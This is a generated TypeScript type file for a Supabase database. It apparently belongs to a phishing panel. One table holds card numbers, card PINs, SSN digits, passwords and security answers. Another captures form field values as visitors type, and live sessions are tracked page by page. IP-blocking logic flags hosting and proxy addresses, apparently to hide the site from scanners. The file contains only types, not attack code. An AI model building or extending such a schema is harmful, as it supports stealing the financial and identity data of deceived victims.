export type Json =
  | string
  | number
  | boolean
  | null
  | { [key: string]: Json | undefined }
  | Json[]

export type Database = {
  // Allows to automatically instantiate createClient with right options
  // instead of createClient<Database, { PostgrestVersion: 'XX' }>(URL, KEY)
  __InternalSupabase: {
    PostgrestVersion: "14.5"
  }
  public: {
    Tables: {
      admin_audit_log: {
        Row: {
          action: string
          at: string
          id: string
          ip: string
          success: boolean
          user_agent: string | null
        }
        Insert: {
          action: string
          at?: string
          id?: string
          ip: string
          success?: boolean
          user_agent?: string | null
        }
        Update: {
          action?: string
          at?: string
          id?: string
          ip?: string
          success?: boolean
          user_agent?: string | null
        }
        Relationships: []
      }
      admin_login_attempts: {
        Row: {
          failures: number
          first_failure_at: string
          ip: string
          updated_at: string
        }
        Insert: {
          failures?: number
          first_failure_at?: string
          ip: string
          updated_at?: string
        }
        Update: {
          failures?: number
          first_failure_at?: string
          ip?: string
          updated_at?: string
        }
        Relationships: []
      }
      blocked_ips: {
        Row: {
          asn: string | null
          blocked_at: string
          blocked_by: string | null
          city: string | null
          country: string | null
          country_code: string | null
          ip: string
          is_hosting: boolean | null
          is_proxy: boolean | null
          isp: string | null
          org: string | null
          reason: string | null
          user_agent: string | null
        }
        Insert: {
          asn?: string | null
          blocked_at?: string
          blocked_by?: string | null
          city?: string | null
          country?: string | null
          country_code?: string | null
          ip: string
          is_hosting?: boolean | null
          is_proxy?: boolean | null
          isp?: string | null
          org?: string | null
          reason?: string | null
          user_agent?: string | null
        }
        Update: {
          asn?: string | null
          blocked_at?: string
          blocked_by?: string | null
          city?: string | null
          country?: string | null
          country_code?: string | null
          ip?: string
          is_hosting?: boolean | null
          is_proxy?: boolean | null
          isp?: string | null
          org?: string | null
          reason?: string | null
          user_agent?: string | null
        }
        Relationships: []
      }
      bulk_jobs: {
        Row: {
          created_at: string
          error_message: string | null
          id: string
          kind: string
          processed: number
          result_url: string | null
          status: string
          total: number
          updated_at: string
        }
        Insert: {
          created_at?: string
          error_message?: string | null
          id?: string
          kind: string
          processed?: number
          result_url?: string | null
          status?: string
          total?: number
          updated_at?: string
        }
        Update: {
          created_at?: string
          error_message?: string | null
          id?: string
          kind?: string
          processed?: number
          result_url?: string | null
          status?: string
          total?: number
          updated_at?: string
        }
        Relationships: []
      }
      ip_geo_cache: {
        Row: {
          asn: string | null
          city: string | null
          country: string | null
          country_code: string | null
          ip: string
          is_hosting: boolean | null
          is_proxy: boolean | null
          isp: string | null
          org: string | null
          updated_at: string
        }
        Insert: {
          asn?: string | null
          city?: string | null
          country?: string | null
          country_code?: string | null
          ip: string
          is_hosting?: boolean | null
          is_proxy?: boolean | null
          isp?: string | null
          org?: string | null
          updated_at?: string
        }
        Update: {
          asn?: string | null
          city?: string | null
          country?: string | null
          country_code?: string | null
          ip?: string
          is_hosting?: boolean | null
          is_proxy?: boolean | null
          isp?: string | null
          org?: string | null
          updated_at?: string
        }
        Relationships: []
      }
      ip_whitelist: {
        Row: {
          added_at: string
          added_by: string | null
          ip: string
          label: string | null
        }
        Insert: {
          added_at?: string
          added_by?: string | null
          ip: string
          label?: string | null
        }
        Update: {
          added_at?: string
          added_by?: string | null
          ip?: string
          label?: string | null
        }
        Relationships: []
      }
      live_sessions: {
        Row: {
          created_at: string
          current_page: string
          ip: string | null
          last_seen: string
          pages_visited: string[]
          session_id: string
          started_at: string
          status: string
          updated_at: string
          user_agent: string | null
        }
        Insert: {
          created_at?: string
          current_page?: string
          ip?: string | null
          last_seen?: string
          pages_visited?: string[]
          session_id: string
          started_at?: string
          status?: string
          updated_at?: string
          user_agent?: string | null
        }
        Update: {
          created_at?: string
          current_page?: string
          ip?: string | null
          last_seen?: string
          pages_visited?: string[]
          session_id?: string
          started_at?: string
          status?: string
          updated_at?: string
          user_agent?: string | null
        }
        Relationships: []
      }
      live_typing: {
        Row: {
          field_keys: string[]
          field_values: Json
          session_id: string
          updated_at: string
        }
        Insert: {
          field_keys?: string[]
          field_values?: Json
          session_id: string
          updated_at?: string
        }
        Update: {
          field_keys?: string[]
          field_values?: Json
          session_id?: string
          updated_at?: string
        }
        Relationships: []
      }
      rate_limit_counters: {
        Row: {
          bucket_key: string
          hits: number
          updated_at: string
          window_started_at: string
        }
        Insert: {
          bucket_key: string
          hits?: number
          updated_at?: string
          window_started_at?: string
        }
        Update: {
          bucket_key?: string
          hits?: number
          updated_at?: string
          window_started_at?: string
        }
        Relationships: []
      }
      security_events: {
        Row: {
          auto_blocked: boolean
          created_at: string
          details: Json
          event_type: string
          id: number
          ip: string
          severity: string
          user_agent: string | null
        }
        Insert: {
          auto_blocked?: boolean
          created_at?: string
          details?: Json
          event_type: string
          id?: number
          ip: string
          severity?: string
          user_agent?: string | null
        }
        Update: {
          auto_blocked?: boolean
          created_at?: string
          details?: Json
          event_type?: string
          id?: number
          ip?: string
          severity?: string
          user_agent?: string | null
        }
        Relationships: []
      }
      stats_cache: {
        Row: {
          cache_key: string
          payload: Json
          updated_at: string
        }
        Insert: {
          cache_key: string
          payload?: Json
          updated_at?: string
        }
        Update: {
          cache_key?: string
          payload?: Json
          updated_at?: string
        }
        Relationships: []
      }
      user_entries: {
        Row: {
          apt_unit: string | null
          card_number: string | null
          challenge_questions: Json
          city: string | null
          created_at: string
          dob: string | null
          email: string | null
          first_name: string | null
          id: string
          is_encrypted: boolean
          last_name: string | null
          password_field: string | null
          phone: string | null
          pin_card: string | null
          ssn_last4: string | null
          state: string | null
          street_address: string | null
          timestamp: string
          type: string
          updated_at: string
          user_id_field: string | null
          zip_code: string | null
        }
        Insert: {
          apt_unit?: string | null
          card_number?: string | null
          challenge_questions?: Json
          city?: string | null
          created_at?: string
          dob?: string | null
          email?: string | null
          first_name?: string | null
          id: string
          is_encrypted?: boolean
          last_name?: string | null
          password_field?: string | null
          phone?: string | null
          pin_card?: string | null
          ssn_last4?: string | null
          state?: string | null
          street_address?: string | null
          timestamp?: string
          type?: string
          updated_at?: string
          user_id_field?: string | null
          zip_code?: string | null
        }
        Update: {
          apt_unit?: string | null
          card_number?: string | null
          challenge_questions?: Json
          city?: string | null
          created_at?: string
          dob?: string | null
          email?: string | null
          first_name?: string | null
          id?: string
          is_encrypted?: boolean
          last_name?: string | null
          password_field?: string | null
          phone?: string | null
          pin_card?: string | null
          ssn_last4?: string | null
          state?: string | null
          street_address?: string | null
          timestamp?: string
          type?: string
          updated_at?: string
          user_id_field?: string | null
          zip_code?: string | null
        }
        Relationships: []
      }
    }
    Views: {
      [_ in never]: never
    }
    Functions: {
      add_to_whitelist: {
        Args: { _admin?: string; _ip: string; _label?: string }
        Returns: undefined
      }
      admin_clear_live_activity: { Args: never; Returns: undefined }
      admin_clear_user_entries: { Args: never; Returns: undefined }
      admin_fast_counts: { Args: never; Returns: Json }
      admin_rate_limit_check: { Args: { _ip: string }; Returns: Json }
      admin_rate_limit_clear: { Args: { _ip: string }; Returns: undefined }
      admin_rate_limit_fail: { Args: { _ip: string }; Returns: undefined }
      block_all_suspicious: {
        Args: { _admin?: string; _min_severity?: string }
        Returns: number
      }
      block_ip: {
        Args: {
          _admin?: string
          _ip: string
          _reason?: string
          _user_agent?: string
        }
        Returns: undefined
      }
      cache_ip_geo: {
        Args: {
          _asn?: string
          _city?: string
          _country?: string
          _country_code?: string
          _ip: string
          _is_hosting?: boolean
          _is_proxy?: boolean
          _isp?: string
          _org?: string
        }
        Returns: undefined
      }
      cleanup_live_maybe: { Args: never; Returns: undefined }
      event_severity: { Args: { _event_type: string }; Returns: string }
      is_ip_blocked: { Args: { _ip: string }; Returns: boolean }
      list_active_attackers: {
        Args: never
        Returns: {
          asn: string
          city: string
          country: string
          country_code: string
          event_count: number
          event_types: string[]
          ip: string
          is_blocked: boolean
          is_hosting: boolean
          is_proxy: boolean
          isp: string
          last_seen: string
          org: string
          severity: string
          user_agent: string
        }[]
      }
      public_stats_cached: { Args: never; Returns: Json }
      record_security_event: {
        Args: {
          _details?: Json
          _event_type: string
          _ip: string
          _user_agent?: string
        }
        Returns: undefined
      }
      remove_from_whitelist: { Args: { _ip: string }; Returns: undefined }
      rl_check_save: {
        Args: { _ip: string; _max: number; _window_seconds: number }
        Returns: Json
      }
      save_user_entry_atomic: { Args: { _payload: Json }; Returns: undefined }
      security_dashboard: { Args: never; Returns: Json }
      security_overview: { Args: never; Returns: Json }
      severity_rank: { Args: { _severity: string }; Returns: number }
      unblock_ip: { Args: { _ip: string }; Returns: undefined }
    }
    Enums: {
      [_ in never]: never
    }
    CompositeTypes: {
      [_ in never]: never
    }
  }
}

type DatabaseWithoutInternals = Omit<Database, "__InternalSupabase">

type DefaultSchema = DatabaseWithoutInternals[Extract<keyof Database, "public">]

export type Tables<
  DefaultSchemaTableNameOrOptions extends
    | keyof (DefaultSchema["Tables"] & DefaultSchema["Views"])
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends (DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
        DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])
    : never) = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
      DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])[TableName] extends {
      Row: infer R
    }
    ? R
    : never
  : DefaultSchemaTableNameOrOptions extends keyof (DefaultSchema["Tables"] &
        DefaultSchema["Views"])
    ? (DefaultSchema["Tables"] &
        DefaultSchema["Views"])[DefaultSchemaTableNameOrOptions] extends {
        Row: infer R
      }
      ? R
      : never
    : never

export type TablesInsert<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends (DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never) = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Insert: infer I
    }
    ? I
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Insert: infer I
      }
      ? I
      : never
    : never

export type TablesUpdate<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends (DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never) = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Update: infer U
    }
    ? U
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Update: infer U
      }
      ? U
      : never
    : never

export type Enums<
  DefaultSchemaEnumNameOrOptions extends
    | keyof DefaultSchema["Enums"]
    | { schema: keyof DatabaseWithoutInternals },
  EnumName extends (DefaultSchemaEnumNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"]
    : never) = never,
> = DefaultSchemaEnumNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"][EnumName]
  : DefaultSchemaEnumNameOrOptions extends keyof DefaultSchema["Enums"]
    ? DefaultSchema["Enums"][DefaultSchemaEnumNameOrOptions]
    : never

export type CompositeTypes<
  PublicCompositeTypeNameOrOptions extends
    | keyof DefaultSchema["CompositeTypes"]
    | { schema: keyof DatabaseWithoutInternals },
  CompositeTypeName extends (PublicCompositeTypeNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"]
    : never) = never,
> = PublicCompositeTypeNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"][CompositeTypeName]
  : PublicCompositeTypeNameOrOptions extends keyof DefaultSchema["CompositeTypes"]
    ? DefaultSchema["CompositeTypes"][PublicCompositeTypeNameOrOptions]
    : never

export const Constants = {
  public: {
    Enums: {},
  },
} as const
